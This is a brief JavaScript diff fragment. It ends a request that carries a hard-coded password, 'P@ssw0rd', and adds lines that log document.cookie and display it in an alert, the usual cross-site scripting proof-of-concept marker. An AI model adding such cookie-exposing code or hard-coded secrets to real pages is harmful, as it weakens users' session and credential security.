@@ -9,3 +9,6 @@ if(t){
     body: JSON.stringify("P@ssw0rd")
   });
 }
+
+console.log("Cookies:", document.cookie);
+alert("Cookies: " + document.cookie);
